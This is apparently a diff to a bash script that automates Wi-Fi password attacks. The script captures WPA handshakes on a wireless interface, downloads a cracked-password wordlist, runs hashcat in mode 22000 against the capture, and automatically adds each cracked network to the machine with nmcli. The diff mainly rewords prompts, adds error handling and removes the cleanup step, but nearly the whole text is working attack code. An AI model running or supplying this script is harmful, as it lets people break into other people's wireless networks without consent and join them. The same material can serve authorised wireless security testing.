@@ -43,13 +43,13 @@ function print_terms {
 
 # Function to check if the script is run as root
 function check_root {
-    if [ $(id -u) != 0 ]; then
-        echo -e "${RED}> Run the script as ROOT or use sudo, and try again.${RESET}"
+    if [ "$(id -u)" -ne 0 ]; then
+        echo -e "${RED}> This script must be run as root. Exiting...${RESET}"
         exit 1
     fi
 }
 
-# Function to detect Linux distribution
+# Function to detect the Linux distribution
 function detect_distro {
     if [ -f /etc/os-release ]; then
         source /etc/os-release
@@ -57,10 +57,11 @@ function detect_distro {
     fi
 }
 
-# Function to install required tools
+# Function to install necessary tools
 function install_tools {
     for tool in ${tools[@]}; do
         if ! command -v $tool &> /dev/null; then
+            echo -e "${BLUE}> Installing $tool...${RESET}"
             case $distribution in
                 ubuntu|kali|debian|linuxmint|zorin)
                     apt update -y
@@ -79,6 +80,8 @@ function install_tools {
                     exit 1
                     ;;
             esac
+        else
+            echo -e "${BLUE}> $tool is already installed.${RESET}"
         fi
     done
 }
@@ -86,10 +89,12 @@ function install_tools {
 # Function to set up the network interface for packet capture
 function setup_network {
     ip addr
-    read -p "> Enter the wireless INTERFACE to use [default=$default_interface] : " interface
+    read -p "> Enter the interface name (default: $default_interface) : " interface
     interface=${interface:-$default_interface}
-    read -p "> Enter the PATH and NAME to save the capfile [/path/name] : " cap
+    echo -e "${BLUE}> Setting up $interface...${RESET}"
+    read -p "> Enter the name of the file to save the capture (without extension): " cap
     cap=${cap:-"$(pwd)/$(date +%T)"}
+    echo -e "${BLUE}> Starting handshake capture on $interface...${RESET}"
     systemctl stop wpa_supplicant.service
     systemctl stop NetworkManager.service
     systemctl daemon-reload
@@ -108,22 +113,23 @@ function capture_handshake {
     systemctl start wpa_supplicant.service
     systemctl start NetworkManager.service
     systemctl daemon-reload
+    echo -e "${BLUE}> Handshake capture completed. File saved as $cap.pcapng${RESET}"
 }
 
-# Function to start cracking the captured hash
+# Function to start cracking the handshake
 function start_cracking {
     read -p "> Start password cracking with HASHCAT? [y/n] : " crack
     case $crack in
         y|Y)
-            read -p "> Do you want to download WORDLIST file? [1=download-it/2=already-have-it/3=use-another-wordlist] : " download
+            read -p "> Do you want to use the default wordlist, download a new one, or specify another? [1=default/2=download/3=specify] : " download
             case $download in
                 1)
+                    wordlist=$default_wordlist
+                    ;;                
+                2)
                     mkdir -p /usr/share/wordlists/
                     wget -O /usr/share/wordlists/cracked.txt.gz https://wpa-sec.stanev.org/dict/cracked.txt.gz
                     gunzip /usr/share/wordlists/cracked.txt.gz
-                    wordlist=$default_wordlist
-                    ;;
-                2)
                     wordlist=$default_wordlist
                     ;;
                 3)
@@ -134,26 +140,24 @@ function start_cracking {
                     ;;
             esac
             hashcat -a 0 -m 22000 -w 4 $cap.hash $wordlist -o $cap.hacked
-            while IFS=: read -r _ _ _ SSID PASSWORD; do
-                if [[ -n $SSID && -n $PASSWORD ]]; then
-                    echo -e "${RED}> Adding network SSID: $SSID with PASSWORD: $PASSWORD ${RESET}"
-                    nmcli connection add type wifi con-name $SSID ifname $interface ssid $SSID wifi-sec.key-mgmt wpa-psk wifi-sec.psk $PASSWORD
-                else
-                    echo -e "${RED}> No network has been hacked.${RESET}"
-                fi
-            done < $cap.hacked
+            if [ $? -eq 0 ]; then
+                while IFS=: read -r _ _ _ SSID PASSWORD; do
+                    if [[ -n $SSID && -n $PASSWORD ]]; then
+                        echo -e "${RED}> Adding network SSID: $SSID with PASSWORD: $PASSWORD ${RESET}"
+                        nmcli connection add type wifi con-name $SSID ifname $interface ssid $SSID wifi-sec.key-mgmt wpa-psk wifi-sec.psk $PASSWORD
+                    else
+                        echo -e "${RED}> No network has been hacked.${RESET}"
+                    fi
+                done < $cap.hacked
+            else
+                echo -e "${RED}> Cracking failed. Exiting...${RESET}"
+                exit 1
+            fi
             ;;
         *)
             exit 0
             ;;
     esac
-}
-
-# Function to clean up temporary files
-function cleanup {
-    echo -e "${BLUE}> Cleaning up temporary files...${RESET}"
-    rm -f $cap.pcapng
-    echo -e "${BLUE}> Done.${RESET}"
 }
 
 # Main script execution starts here
@@ -169,7 +173,6 @@ case $terms in
         setup_network
         capture_handshake
         start_cracking
-        cleanup
         ;;
     *)
         echo -e "${RED}> You are UNAUTHORIZED to use the Script.${RESET}"
